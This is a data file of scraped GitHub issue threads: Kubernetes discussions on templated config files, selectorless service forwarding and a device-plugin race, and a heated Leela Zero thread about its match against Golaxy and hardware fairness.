ConfigMap volumes should become deprecated as much less powerful than templating. What we need The current state of PoC implements a lot for this proposal. What is still missing is  Single file mounts Templates in separate files Secret data consumption Consuming several configmaps directly (you can use configmap links however)  Questions  Are there any objects beside Pods, Secrets and ConfigMaps we want to be source of data? Do we need any tools in our templates beside simple interpolation of values and text/template tools?  I would like to call @friend and @friend to pay attention to this thread as well. The next two weeks I will login irregularly, but please comment.  Oh, also @friend - please comment if these requirements are enough for us.  @friend Looks good, there is one of the examples we will be happy to see covered with templates.  @friend plus one BTW, one of the examples I'm dealing with is PostgreSQL, where the config files need to go into a specific directory, which also contains files we want to inherit from the upstream image.  Postgres also has specific permissions requirements for those files.  So I think that's a good test case for any scheme; if it can handle Postgres, it can probably cover any service.  Some answers  Are there any objects beside Pods, Secrets and ConfigMaps we want to be source of data?  If by ""pods"" you mean ""everything currently available via the core Downward API"" then those three things cover all of the use cases I have.  Do we need any tools in our templates beside simple interpolation of values and text/template tools?  I do not for my use cases.  So I have some thoughts here based on the ""datacenter as a computer"" and ""k8s as a cloud OS"" abstractions. I think the fundamental primitive that we're lacking is higher-level environment variables. So what I think would be most powerful here is the abstract concept of an  that provides variables that can be interpolated for probably any sort of resource. This would be exactly analagous to the way  and the way environment variables are usable/overridable at the separate levels of a standalone OS. So, what I would propose as an alternative would be an `Environment ♠yaml  @friend I'm not seeing how this lets me drop a Pod IP into a config file in the container?  Ah, sorry, I missed the example of dropping in the pod IP. I've never really had that particular issue, since the pod IP is already known to the process (that is,  or  will return the pod IP). Still, I think there's a growing problem in k8s of ""kind"" sprawl, so if we're proposing a templating solution, I'd rather see something generically applicable for any existing object, however it makes sense for those objects (much like a bash environment abstraction). That said, if you wanted to add dynamic data (e.g. downward API), the  list has always allowed  that supports dynamic data. The problem with my suggested approach if that was allowed, though, is that you now have the potential for cycles if  is used. This is a problem with the previously-proposed solution as well; that or deadlocks if two Templates refer to one anothers' products, so either way some thought ought to be put into that case, in which case I think it's likely applicable for both solutions.  On further thought, a  construct could be shorthand for a command that gets run in an init container which is basically just the kube* tools (most importantly kubectl) set up for in-cluster commands. This would be quite powerful and fit with the general that one can also run any OS command inside $() in a shell.  @friend huh.  where is that documented?  @friend I thought we had doc on this, but I couldn't find any after a brief search (we'll fix that); design doc is  I swear this is documented.  Please tell me it is documented... On Mon, Aug 22, 2016 at 616 PM, Paul Morie notifications@friend.com wrote  @friend This is pretty much what my internal monologue is saying right now...  I see it referenced in a couple places  API Reference ConfigMap docs  ...but it looks like there is no good user-facing doc for this.  I'll write some ASAP.  I swear I remember writing doc for this...  Regarding improvements for environment variables I believe this is out of scope for this proposal. This one is specifically to allow DRY and simple generation of configuration files. Especially for some legacy apps, that would otherwise need startup scripts. Regarding the choice of templating language The text/templates module has more than enough power for our purpose. It is easily extensible besides. It also is a builtin and is quite intuitive, so we lower the entry level for new programmers of this feature. If someone believes we could need some more power, we could expose some entry point to allow plugging template filters (I don't think that would ever be necessary, but it can be implemented)  Given the previous discussions in the template proposal, we are unlikely to use Go templates as a first class mechanism.  I highly recommend reading that proposal and the associated issue for context - that will impact how any proposal in this space would be constrained.  ... choice of templating syntax still seems like the least important thing about this discussion.  Especially since we might not do templates at all.  @friend Env. substitution does not have a user-facing doc AFAIK. See #15244 re. how disorganized our pod/container docs are. Please reach out to sig-docs for advice about where to put this content.  See also #11492  Ref #2068  @friend Links to examples of entrypoint.sh scripts?  Note that we've also talked about creating a library of sidecars  We don't allow env vars to be changed today, but I could imagine supporting that in the future, and we do allow ConfigMap changes, so I think initContainers won't work and though I'm a fan of container volumes (#831), I think that shares the same problem. Image volumes (also #831) would allow config files to be packaged separately, however, as mentioned above.  cc @friend  Maybe @friend has suggestions, also.  I must be losing my touch. I was sure that @friend previously proposed an inline volume source, but I can't find it. That said, I like @friend's command-line alternative.  The template proposal was #18215 and the doc is here  implementation issue is #23896  @friend so that's a different kind of template, one for the service definition itself, rather than a template for files to be pushed into the running containers.  @friend Some examples  Patroni Postgres    Note how pretty much all that entrypoint script does is create a config file out of ENV variables.  And yet, it's vulnerable to quoting issues, disrupts signal processing, etc.  Official Postgres Image for Docker  one does several things, but I'd like to call out this horrible line  Redmine, official image  (worst case, really)  we can't get Docker to change the official images because they won't have configfile support.  But we could make it not necessary for our users to go to such lengths.  @friend i question how many people want config map changes inline (in practice) vs deployment controlled.  config map changes inline are ""hooray, now your application is broken all at once"" so I think they are reserved for sophisticated users. On Wed, Aug 31, 2016 at 743 PM, Josh Berkus notifications@friend.com wrote  @friend I agree about inline configmaps. I was just looking for past discussions about related topics.  Working through the comments in this thread I would strongly suggest we not build a configuration management tool into Kubernetes. Once we go this route there will be no turning back, we will reach a point of owning a subset of functionally that every configuration management tool does. Today the request is for dynamic configuration with the ability to pull data from any source. Tomorrow it will be nested configuration, permissions, merging, and pushing data back into Kubernetes to be consumed by other pods and containers. Dynamic configuration can be accomplished with init-containers and sidecars, what we lack is great documentation and working examples of how to do it using existing tools such as confd, consul-template, or ansible. Is there any chance the community can spend some time working with what we have and writing up the results after several rounds of experimenting? The reason all of this seems hacky is because it is. The fact that some people want to extract configuration and templates from container images and merge them with user defined configuration and templates will be the source of pain to come. One idea I've experimented with is running something like consul-template or confd in a controller that would render templates based on external data (secrets, configmaps, consul, etc) into other secrets and/or configmaps that are consumed by pods. This would get us 90% there in terms of dynamic configuration. The last mile stuff is a little harder. Once your app needs pod level information, then the user is forced to run the configuration tool as an init-container or sidecar. The main challenge is combining configuration and templates that ship inside of a container image with the user defined configuration and templates stored in Kubernetes. I think we should ask the community to strongly consider avoiding this problem entirely. Since my days at Puppet Labs, its always been considered a good idea to separate application code and configuration. In the case of Kubernetes that would mean storing all configuration files and templates outside of container images and ensuring that each configuration file is referenced from a Kubernetes configmap or secret, which may have been generated from an external configuration controller running in the cluster. This keeps Kubernetes easy to reason about. For the last mile stuff like ""I need my Pod IP"", then users will need to rerun a templating tool from an init container and refresh the config from a sidecar. We have the same problem for all dynamic content including short lived secrets such as the ones you get from HashiCorps vault project. The problem here is that a very small subset of applications really want Pod level details, which feels like a real one off to me. I rather not build a general solution for what feels like a one off.  @friend ""The problem here is that a very small subset of applications really want Pod level details, which feels like a real one off to me."" Given that I started down this particular quest based on something you said, this seems like a contradictory attitude.  Do you want people to get rid of ""init scripts for hipsters"", or not?  If you really do, the answer is to make doing things the right way easier, rather than much harder.  BTW, I'm not saying that a template object is the answer.  I'm just saying that we need an answer which isn't ""implement this long complicated toolchain involving several different kinds of objects"".  Inline volumes discussed in  Thu, Sep 1, 2016 at 913 AM, Josh Berkus notifications@friend.com wrote  @friend Those examples are helpful, thanks.  @friend  If the idea of using any templating language above simple substitution is rejected, will it be acceptable to allow for plugins (containerised?) that would receive the template and JSON data and perform the template rendering?  Yes, although that's effectively what an init container is (a plugin to pod initialization).  If the usability of doing that is hard, we can improve it. On Tue, Sep 6, 2016 at 936 AM, Szymon Pyżalski notifications@friend.com wrote  Rendered configuration files proposal (v 2.0) Configuration file object The configuration file object specifies one configuration file that can be mounted in a container. They will be specified per pod. Either inlined in pod definition or defined separately and linked in a pod. Example configuration file definition Data sources Data sources are objects that contain data that can be used in this config file. The data sources can be  configmaps secrets environment variables  also a pod is a data source that exposes several values like  PodIP Labels Name  Every data source has a name. The pod is automatically added with reserved name . The environment variables as mapping under reserved name Config Config can be any mapping. The specification for config depends on the renderer. Renderer A renderer is a container that is creating the actual content for the file. Thanks to the renderer all the templating (or other) logic is moved from the k8s core that can be unopinionated on how the rendering should take place. The renderer when called is passed  The config (as it is) The data from all the sources as a mapping {sourceName data}  The renderer should produce the config file content and exit. Summary The above proposal allows for  Declarative and DRY creation of configuration files Easy reuse of data in configmaps Simple and reusable implementation of templating that is however separated from the core Usage of basic pod facts and interpolating them in configuration files Future implementation of data propagation   On Wed, Aug 31, 2016 at 636 PM, Clayton Coleman notifications@friend.com wrote I use it as a small-file push mechanism  How is this better than adding a template-renderer container that reads the template from a flag or file and renders into a volume? On Fri, Sep 9, 2016 at 1213 AM, Szymon Pyżalski notifications@friend.com wrote  @friend it seems to be simpler and more generic. Everything is in the config file. The mount logic is in core. So we don't need any hacky init container logic.  That is not a very compelling reason.  The cost of things in core is 10x the cost of things out of core. On Mon, Sep 12, 2016 at 1212 AM, Szymon Pyżalski notifications@friend.com wrote  Tim, you are the very definition of sophisticated user here )​  I think there is probably some missing semantic sugar around pods of this form.  One might be directly inlining small files via a volume type, which avoids entrypoint hackiness.  We'd have to strongly control size though. I look at the vitess examples and think that is a reasonable ""higher end"" configuration size for a pod ( one where an inline file would improve the organization of the code.  I was all into inline volumes, but ConfigMap is more powerful and already exists. On Mon, Sep 12, 2016 at 1146 AM, Clayton Coleman notifications@friend.com wrote  Wow, @friend, thanks for the vitess example. I think this section is an excellent example of one of the emerging patterns that makes practical use of kubernetes harder (and less portable) than it needs to be. To boil down my opinions concisely, I think there are two patterns emerging that are used solely for the case of handling (respectively) cluster-level variables and runtime variables  Explicitly pre-processing of manifests via shell script Explicitly post-processing of Kube objects via init containers/scripts  I think these two use cases are pervasive enough that they warrant some syntactic sugar and integration into the tool/environment to eliminate both types of wrapper scripts (wrapping kubectl and wrapping your containerized process). To address @friend's concerns about ending up writing a CMDB, I think that kube crossed that bridge long ago when ConfigMaps and Secrets were added and allowed those to be mapped to environment variables or files. We're storing our config in our cluster/namespaces already, but restricted to confusing (while powerful) ways of consuming that data (wrappers/init containers). So, that said, can we at least agree that for the sake of user experience, it would be beneficial to have an integrated, easy-to-understand and easy-to-use, way of getting their cluster config and metadata into their kube objects? Not that it can't be solved dozens of other ways, which is clearly true, but that in terms of usability for all sorts of users, can't we do better?  ConfigMap is not update safe (without extra care today) and can't be delivered easily as an atomic unit.  I agree there are downsides to inline volumes, but I do think small ones would be a net usability win.  The section you pasted is really just a PetSet - when this example was written it wasn't possible, but it's really the same concept (and was taken into account during the petset core design).  On Mon, Sep 12, 2016 at 1240 PM, Clayton Coleman notifications@friend.com wrote I don't understand this.  It's not atomic wrt all pods getting updates at the same time, but it's not as if they see a half-cooked state of the CM.  The only upside I see to an inline volume is the inline-ness of it.  You create config.  App gets deployed.  You're happy.  Someone updates the config.  A node is evacuated elsewhere in the cluster and one of your pods picks up the new config.  Everything fails.  You try to figure out what the old values of config are.  You cry. The sharp edges of that ""surprise, your app doesn't work"" are what I'm most concerned with.  We tell everyone to use configmaps, and a non-trivial percentage of people don't reason about the interaction of config map with an administrator evacuating a node, and a non-trivial percentage of applications will fail and fail hard with mismatched config.  So trying to find places where the path of least surprise is exactly how you expect the platform to work, even if you don't think about it, and then you can go use it in sophisticated and awesome ways later.  If configmaps defaulted to readonly after creation, and you had to go think about allowing them to mutate, that would be one example of safety.  Or if the configmap automatically preserved old versions of itself that you could roll back to. The advantage of inline configmap is that it cannot be out of sync with the cluster and can be propagated through a deployment in a trivially correct way. On Mon, Sep 12, 2016 at 608 PM, Tim Hockin notifications@friend.com wrote  Can we split off the discussion of live updating configmaps after deployment into a separate proposal?  It's really a completely different feature.  It's relevant with respect to inline configmaps templating and making it easier to do config templating inline with the minimal syntax.  An inline config map avoids bash squirreliness and makes a wider range of init container templating engine options feasible.  So I don't think it's separate. On Mon, Sep 12, 2016 at 725 PM, Josh Berkus notifications@friend.com wrote  Don't think it's totally separate.  We already have an issue for the live updating. On Mon, Sep 12, 2016 at 736 PM, Clayton Coleman ccoleman@friend.com wrote  It does seem to be at least tangentially related, though I think the topic of ""what happens if the config map changes"" is still orthogonal to ""can templated config maps change if upstream data sources change?"" The latter seems very relevant. IMO the inline config map vs external config map would also be irrelevant given a good templating solution. If the templating solution is complete, then either option should reasonably accept template placeholders. Also to address another of @friend 's concerns I think we'd all agree with that (if I'm understanding you correctly). And I think the intent is still that in any case, given k8s objects with template expressions, the final product is k8s objects ready for consumption, e.g. mounting into the volume as a config file, resulting in a container image that does not need to be tailored beforehand to k8s.  I think it's important to note that we already have solutions in the ecosystem for complex multi resource templating that we have previously said belong above the core platform - specifically Deployment Manager (now the server component of Helm), local templating + apply, Ansible, and others.  To Kelsey's point, we are trying not to build one of those solutions in the core, because they belong as a properly layered component on top.  Half of the discussion is how to build those (which others are doing) and half has to be on how we make those tools able to do less by having good primitives. I don't think any template language we include will make those tools easier to use, because they will now have multiple languages to apply.  The argument I usually hear is trying to make Kube fit better into Ansible, existing config mgmt flows, HEAT, Deployment Manager, etc.  Mixing template languages is really painful, so it doesn't seem like a clear win if we're meeting the community where they are. For instance, we don't want to put a template language under apply - we want it to be above (an input to apply), so that people can lean on apply to avoid having to do local patch merging. As another example, iterative config application (inputs to template change -&gt; template generates new output -&gt; deployment triggered) requires at least minimal outside orchestration, especially when multiple components are involved.  We aren't eager to make that orchestration a first class concept in kube because it's likely no one orchestrator is a suitable solution for all use cases. A template evaluation environment that is even partially or strongly turing complete has to run in a pod, just by its nature.  Deployment Manager does this with expandybird - as something like what is proposed here grows more flexible it would also have to be run in a pod.  Given that the output of that pod is a transformed local file, it's really hard to justify a completely separate implementation that isn't an init container (at least right now) because the init container is already isolated and under the user's control and doesn't have to implement a separate API / transport channel. The short term things already discussed in this thread have a lot of individual merit  Better doc and examples around existing init container use here (and a really strong minimal example that tries to be as ""api like"" as possible) Inline config maps Prototyping (or working with Helm or the AppController guys) an orchestrator that can copy config map changes for deployments (and can by definition also go run templates) to show your desired flow Projection of volumes into pods more effectively (@friend spawned an issue on this) A better way to catalog / inject helpful sidecar patterns into containers (kubectl add-sidecar deployment/foo --from=mylibrary-of-sidecars)  Did I miss any? On Mon, Sep 12, 2016 at 823 PM, Andrew Stuart notifications@friend.com wrote  On Mon, Sep 12, 2016 at 413 PM, Clayton Coleman notifications@friend.com wrote I assume you mean ""without bouncing the pod, and the app does not pick it up dynamically"" Someone laid a land mine and was sad when they stepped on it.  I 100% agree land mines are bad, but this is not the first such case. ReplicationController and ReplicaSet have the same problems.  Docker image tags being mutable have the same problems. Conversely, if you had defined it as an inline volume, RC and RS would fail the same way, and Deployment would try to roll out and fail right away. If you don't want a time bomb, you HAVE to actuate changes right away, regardless of whether that's an inline or not. Is ""I updated a config map"" really more confusing than ""I updated my replication controller"" ?  In both cases, it is part of your ""app DAG"" and you updated it. Mismatched config is a fact of life, no matter what - whether that is a rolling update or an accidental land mine. This is why we generally tell people not to update configmaps, but create a new one, update your deployment, and do an rolling update. I don't buy it - you can lay almost the same traps with an inline, if you're not careful.  I'm not AGAINST an inline volume, per se, I just don't see the value that justifies the extra complexity.  I'm willing to be swayed by ""but UX"", but this, in the end, just a TINY piece of what this bug is aboyut.  @friend, all I'm inclined at this point to close this in favor of a proposal of ""make init containers easier to use"", which seems like the way to go.  However, there have been a LOT of other proposals on this issue which aren't mine; is it OK to just close it nevertheless?  @friend I don't think so that init container is the way to go, proposal submitted by @friend looks nice. And I think it's worth solving it a bit at configmap level.  I wonder if resource templating as a whole would be worth discussing on the community call ( cc @friend ) (Or, is there an appropriate SIG?). For me, there are already too many in-motion proposals and implementations (the helm tool and this templating issue spring to mind) to keep track of. Even if it's just a ""yes, we are going with 23896 for the foreseeable future"" acknowledgement, it'd be helpful in my mind for some sort of consensus and communication about the project's direction on this matter.                                                                                    There are some plans to discuss that on sig-apps.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        From Andrew StuartSent środa, 28 września 2016 1927To kubernetes/kubernetesReply To kubernetes/kubernetesCc Jędrzej Nowak; CommentSubject Re [kubernetes/kubernetes] Proposal Template object for in-container configuration files (#30716)I wonder if resource templating as a whole would be worth discussing on the community call ( cc @friend ) (Or, is there an appropriate SIG?). For me, there are already too many in-motion proposals and implementations (the helm tool and this templating issue spring to mind) to keep track of. Even if it's just a ""yes, we are going with 23896 for the foreseeable future"" acknowledgement, it'd be helpful in my mind for some sort of consensus and communication about the project's direction on this matter.  —You are receiving this because you commented.Reply to this email directly, view it on GitHub, or mute the thread. {""api_version""""1.0"",""publisher""{""api_key""""05dde50f1d1a384dd78767c55493e4bb"",""name""""GitHub""},""entity""{""external_key""""github/kubernetes/kubernetes"",""title""""kubernetes/kubernetes"",""subtitle""""GitHub repository"",""main_image_url"""" in GitHub"",""url"""" in #30716 I wonder if resource templating as a whole would be worth discussing on the community call ( cc @friend ) (Or, is there an appropriate SIG?). For me, there are already too many in-motion proposals and implementations (the helm tool and this templating issue spring to mind) to keep track of. Even if it's just a \""yes, we are going with 23896 for the foreseeable future\"" acknowledgement, it'd be helpful in my mind for some sort of consensus and communication about the project's direction on this matter.""}],""action""{""name""""View Issue"",""url"""" @friend @friend @friend @friend @friend could we organize a short discussion in sig-apps about that?  @friend @friend @friend @friend @friend could we organize a short discussion in sig-apps about that?  I don't usually attend sig-apps, please let me know if/when this is on the agenda On Mon, Oct 3, 2016 at 239 AM, Jędrzej Nowak notifications@friend.com wrote  @friend Ditto @friend, and also that nobody's paying me to do k8s work (yet), so my regular work will have to take precedence, but I can definitely try to attend, depending on the time.  Also, you may want to comment on #23896 and/or kubernetes/features#35 if there's going to be a generalized discussion as they will almost certainly have either made progress already or have opinions and suggestions of their own to add.  @friend Is there any chance that there is more documentation beyond the examples you mentioned in  ? I desperately want to share the available syntax with colleagues, but cannot be certain how much is implemented (and in which version).  Any decision has been made on this?  No templates.  Is there a recommended way to inject a configuration file with interpolated variables/secret into a container at the moment?  @friend Please ask on kubernetes-users and/or stackoverflow, or try to build a consensus within SIG Apps.  So , as of now im assuming no we dont / can't encrypt data in configmaps. ",183,483,1387,0,0,937,36,
kubernetes/kubernetes/40870,0.04406026575,kubernetes,kubernetes,Services without selectors cannot forward to other services as documented,5559,50,49,0,5,"Kubernetes version (use ) Environment Google Container Engine, 1.5.2 What happened I created a selectorless service and configured the endpoint to point at the ClusterIP of another service in a different namespace, as described in the documentation   is supported behaviour (""You want to point your service to a service in another Namespace or on another cluster""). Any requests on the External IP of the selectorless service hang. What you expected to happen Requests to be sent to the target service. How to reproduce it (as minimally and precisely as possible) Start this stack Wait for the  service to be allocated an IP, then try to hit it with curl on port 8080 . There is no output. I would expect the output to be 'I am ALPHA'. Anything else we need to know  Hi there, this seems interesting AFAICT, the problem seems to be a mismatch between the docs and what the  in  actually can do. In , the otherwise purely virtual  are realized by smart DNAT-ing on each node in the cluster (done by ). The DNAT rules are more or less the core functionality, and are defined in the NAT table of , on each node, for each existing endpoint of each service in the cluster. From what I can see, the problem in your case is that the DNAT in  is effectively done only once (all the  chains are traversed just once per packet, see here), so that the request to the  service is effectively resolved to a request to  after it comes out of  (i.e. after all  chains are applied). But,  is not a real IP (it's a virtual service IP), and thus your requests fails as it has no real destination. One way to deal with this is to make  recursively resolve the DNAT rules in case there are chained services as in your case, and then sync them with  (the sync is done in real time anyways). Here is a sketch commit of how this can be ""fixed"" in the code (it works in my dev setup). It would be good to hear a second opinion on whether this use case should indeed be supported. In case you are interested, I can open a PR with the fix and try to merge it.  FYI, the service-to-service forwarding chain didn't work in my dev cluster even if both services are in the same namespace (as the problem described above seems to be conceptual). The services being in different namespaces is a whole separate issue on it's own.  Yes, I apologise, I noticed that this functionality doesn't work even in the same namespace while constructing this issue, but did a bad job of removing the references to namespacing.  It's not surprising to me that this doesn't work.  I don't think this particular usage pattern was  tested or even considered really. It's not invalid, but it's a little weird.  Can you use ExternalName instead, to achieve the desired effect? On Thu, Feb 9, 2017 at 453 AM, Michail Kargakis notifications@friend.com wrote  @friend I'm confused, my usage pattern matches exactly what is documented as a use-case for this functionality Please could you describe how my usage pattern is different? I might be able to use , it depends on the TTL, but in my experience using DNS for traffic routing is a bad idea.  instead, to achieve the desired effect? I got this working with ExternalName, just put the FQDN in the externalName property. I'm running on an on-prem cluster running Actually, according to the description in the docs, ExternalName creates a DNS CNAME which, according to wikipedia (my DNS knowledge isn't that great), is This seems to be semantically consistent with what we're doing.  Yeah, IMO we can probably turn this into a documentation issue.  Sounds like the ""feature"" is supported through ExternalName, but the docs don't make it clear how to achieve this.  Issues go stale after 90d of inactivity. Mark the issue as fresh with . Stale issues rot after an additional 30d of inactivity and eventually close. Prevent issues from auto-closing with an  comment. If this issue is safe to close now please do so with . Send feedback to sig-testing, kubernetes/test-infra and/or . /lifecycle stale  Stale issues rot after 30d of inactivity. Mark the issue as fresh with . Rotten issues close after an additional 30d of inactivity. If this issue is safe to close now please do so with . Send feedback to sig-testing, kubernetes/test-infra and/or . /lifecycle rotten /remove-lifecycle stale  Rotten issues close after 30d of inactivity. Reopen the issue with . Mark the issue as fresh with . Send feedback to sig-testing, kubernetes/test-infra and/or fejta. /close  /reopen @friend did you solve this issue? currently the documentation hasn't changed, BTW. see  @friend you can't re-open an issue/PR unless you authored it or you are assigned to it. &lt;details&gt;  In response to [this]( for interacting with me using PR comments are available [here](  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra]( repository. &lt;/details&gt; @friend no, I never managed to get this working as documented. I gave up on this issue as soon as @friend said ""I don't think this particular usage pattern was  tested or even considered really"" when my exact use-case was listed as an example in the documentation (""You want to point your service to a service in another Namespace or on another cluster""). I've encountered enough wontfix attitudes on open source projects to know that pursuing this would exceed the amount of time I have available to finish this work. In the end I used  in TCP mode and configured it with environment variables.  @friend thanks -)  I created #64668 to clarify if we want this. ",13,25,211,0,0,171,4,
kubernetes/kubernetes/56026,0.057748567,kubernetes,kubernetes,Device Plugin Race,1693,20,13,0,0,"Is this a BUG REPORT or FEATURE REQUEST? /kind bug /area hw-accelerators /sig node What happened When re-writing the endpoint code I discovered that the mutex logic is wrong and can lead to a data race while calling the  function. The current logic is a bit convoluted and would make more sense if the map was created in the for loop. However it seems like once the map is assigned to the structure, a device update while calling the  function will lead to a data race, Anything else we need to know? cc @friend  Not quite sure about the race scenario you described, which func do you mean by  function ? The  ?  Did you mean manager.Devices by ?  map is being assigned to  structure with locking protection only. Did you want to say that a race will happen if  is being updated and at the same time  gets invoked? If yes, i dont think so. At both the places, first endpoint.mutex lock is taken. So only one can run at a time and other will wait on mutex. Please let me know if i mistaken something.  Sorry I meant  essentially though the manager.Devices function calls the endpoint.getDevices(). Yes thanks for clarifying this.  I believe we all agree that there is no race in the scenario described in the description of this issue. Shall we close this issue?  @friend there is a race I think I didn't fully read your answer at the time sorry. Because the way maps works when replacing the map in the structure I am now making the Endpoint's map to the local copy of . Which means that every time we lock in the  function we might be changing that copy underneath.  @friend thanks! I got confused b/w call-by-value and call-by-reference and forgot that in golang maps are call by reference. ",7,10,48,0,0,53,8,
gcp/leela-zero/1216,0.216706754,gcp,leela-zero," Leela Zero vs Golaxy ,the 4th game (LZ win)",9776,81,43,0.8,7,"Some info on this game Network 3217 is used (20x256 v9), binary is compiled from  with ponder on Move 191 is commented as the winning move by pro player ( file and win rate below 20180417_Golaxy_v9.txt.gz 20180417_Golaxy_v9.sgf.gz   Is there a english commentary version?  Is there log for game 3? People are curious about the two 3-3 LZ played.  Game 5 who won? I can't read Chinese.  Game 5 Galaxy (B) vs. Leela Zero (W) First B move (m,n) with m,n&gt;5 Result Leela Zero won. Galaxy time  I also heard conflicting reports that it was score of B+2.5 , so that means had it not timed out the golaxy would have won ?  My leela was reporting close to 99% winrate when black resigned. Also after playing the rest of endgame myself score was W+0.5.  @friend thanks for the info. So there is two matches left. Its time to have LZ use the same quality of hardware that Golaxy is afforded to use, and a real official net, and no handicap.  @friend We said it multiple times, hardware are similar.  I heard that, but oczam rasor. if its so similiar (which I'm not necessarily disputing) why not just ues exactly the same to remove all doubt and be more scientific as control and fixed control etc In points of fact, one of the matches at least, its LZ only used 5x 1080Ti where Golaxy used 10x1080Ti, and then they stated ""titanV not optimized"" (not sure if that talking about the Nvidia issue with titanv where its calculations get messed up, or that the team can't get LZ to play optimillay on the TitanV or combination of all of the aboves etc) so I don't see how it can be similar if its at 50% and then buggy  I heard today they used 5x1080ti again today. Golaxy insists on using 10x1080ti. The LZ team has to use whatever they can get hold of.  @friend wow really? considering the 6th line move was less than one stone handicap, and that the fact that Golaxy CHOOSE to play other moves higher going for influence strategy, I would say that LZ could have beat golaxy on even if they used hardware parity. ""LZ team has to use whatever they can get hold of"" ? You mean they can't go on aws and rent out 8x V100 for a match or two?  So wasn't it said after the seven games Golaxy was gonna play ke jie? Why can't LZ also play Ke Jie?  I'd imagine Ke Jie is being paid to attend and play. Top pros don't do public exhibition matches for free. )  You must be really rich. Renting 8xV100 costs 42$/hr. So we will cost 42 $/hr  3 hr  7 d = 882 $. I would rather save 882$ and buy a GTX 1080 to produce tens of thousands of games.  @friend I was under the impression that both the golaxy team and the LZ team for this match are volunteer groups in China. They even seemed to have a fancy dinner before the start of game 1 night. Seeing how five out of seven games have already been played and each game lasts between 1 to 2 hours, this would be only a few hours of renting the 8x v100. Does not seem unreasonable esp when given the context of Golaxy going on after the 7 games to play Ke Jie and the spectulation from roy777 that they were playing Ke Jie to play against their AI bot.  Scenes of Golaxy running  behind Golaxy  did you get the impression that Golaxy is run by volunteers?  Oh my mistake... I didn't know Golaxy was a company.... btw @friend not sure where you got your $42, its actually $24/hr  instance  @friend It seems that renting V100 in East Asia costs much more than in US. You may see $42 or $40 in Tokyo and Seoul.  they got bribed by glolsxy match 6 only three 1080  I think there was an operator misclick today. Leela played the ""obvious"" joseki move which according to the recent network is a 15% mistake.  @friend seriously, you have to stop reacting like a crazy tinfoil hat person without knowing anything about context or facts. If they can't have 10 1080ti for the match, so be it, they are not a rich company, they are passionate people trying to put a good show against golaxy, that's all.  prob next excuse our computer rebooted midgame cause of OS update  serious question who misclicks 2 games out of only 7 between all the misclicks, operator arriving late due to getting stuck in traffic, finding out about titanV ""not optimized"" for LZ until AFTER match already started, using only 1/2 and then only 1/3 the horsepower than its opponent, not knowing about, and not testing the tree size issue prior to game 1, and changing hardware specs every single day, using mystery networks that so far as I know have yet to be published, not publishing logs in the later games of the match.... this is very unprofessional. I could have done a better job than this without any doubt.  I was opposed to the weight of 20B. 15B before the debut 20B weighted more than 80% of the 10B win rate, hardware configuration enough to play; now the 20B to the official 15B winning rate never reached Qi Cheng, and this 60% win rate is still more than double the amount of computing to achieve The hardware that is required to use or not to defeat or even exceed 15B is too high. Did not find out this sector to reduce the use of 20B, is sent in vain.  from  @friend that translation was hard to read. apparently if I understood correctly, someone was opposed to using the combination of higher sized network like the 20block in conjunction with minimial hardware like the 3x 1080, but the advice was sent in vain because no one listened and then they lost to a misclick or aka error of the connector of the operator l My question is since this match was agreed upon, scheduled and announced in advance, how did they not make sure of securing at LEAST the same hardware as golaxy prior to starting the games? This just doesn't make sense. Edit Yes I understand they are volunteers doing it out of labor of love etc etc, but that doesn't mean they should be immune to all criticism for setting up a blotched match, and when one side is using just 30% of the resources of the other side, I call it exactly and precisely that, a blotched game.  Yes, the computation power is for sure imbalanced we know. But what can we do if we do not have such a configure, what can you do if one of volunteers is sick one day? What if the 0.13 release still has a pondering bug you didn't notice? The main point of this match is just for fun, people behind it do it for free, so why are you so mean about it? Who can guarantee to hold a match first time without any issue? If you do not like it, please do not waste your precious time watching, organize your own match instead, with whatever configuration you've got, I don't care. Talk is cheap.  @friend When LZ volunteer team decided on their own volition to schedule and then announce to the broader general public these sets of games, it set itself on the trajectory of creating certain reasonable expectations as par the course of the typical kind of Go match. Had I know ahead of time all the things that would go wrong, all the shenanigans that would be pulled, then maybe that information would have been vital to my deciding how much of my own time and attention I would like to dedicate to watching this unfold, and I’m sure the same or similar could apply to other people in the public community as well.  Once again, when they started the game with the explanation that they had tested 4xTitanV to be equal to performance of 10xGTX1080Ti, they mentioned nothing about the possibility that the rest of the games would have LZ using MUCH LESS hardware specs than its Golaxy opponent. By first giving the impression of a ‘fair’ match by stating that after extensive testing the 4xTitanV basically == 10x GTX1080Ti on perf parity and then only later on mid match flip flopping (for whatever reason or excuse, valid or invalid, but I call it as it is, and this was a bona fide flip flop) by using half and then 3/10th the power, this at the very least FEELS like a bait and switch in which they used a ruse to get people invested emotionally leading them to believe this would be a fair /even match and then did a roundabout by not delivering on almost every metric and standard. And now I suppose the unofficial networks used and the logs for the latter half of the games of the match will not be released to the public as well? For what reason could that be?!  @friend I don't know if someone can get ban of a github and what rules are in place, but if it was up to me you would get ban. There is a pretty big difference between giving feedback or criticism and being straight up rude and mean. At my work someone who would behave like that to their coworkers on a project would be fired.  @friend if you want to talk about ""rules"" of github then per the license and per the rules they (the volunteer LZ team) have to release the modified networks to the public afaik. It is my understanding that as of yet, they have not done so.  I'm not so much bothered about the disparity in hardware (which of course makes it unfair, but that is capitalism for you), but about the fact that settings/networks/hardware are apparently being changed mid match. This means a simple thing it was not tested properly. Before you play the match or tournament, you figure out the optimal configuration. If you are even so much as tempted to change the configuration during the games, it means you did not test properly, because what information can you possibly have gotten in that time period that invalidates your prior test for the optimal configuration? Now, given that  this match is apparently not to be taken seriously, due to the above, and it seems even operator errors stand(?!)  people are starting to lose their shit over it there's no usable info for the development of LZ due to the above and lack of transparency  I'll just close this discussion. There's no use to bother or care about this.  The license only covers distribution. ",37,2,265,0,0,225,21,
